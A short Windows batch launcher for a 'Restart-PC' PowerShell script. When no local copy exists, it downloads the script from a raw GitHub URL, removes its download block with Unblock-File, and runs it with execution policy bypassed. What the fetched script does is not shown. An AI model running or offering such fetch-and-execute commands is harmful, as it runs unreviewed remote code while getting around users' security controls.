@echo off
set "PS1=%USERPROFILE%\Downloads\Restart-PC.ps1"
if exist "%PS1%" (
    start "" powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"
) else (
    start "" powershell -NoProfile -ExecutionPolicy Bypass -Command "& {$t=[IO.Path]::GetTempPath()+'Restart-PC.ps1';Invoke-WebRequest 'https://raw.githubusercontent.com/Aniket369/github-slideshow/gh-pages/setup/Restart-PC.ps1' -OutFile $t -UseBasicParsing;Unblock-File $t;& $t}"
)
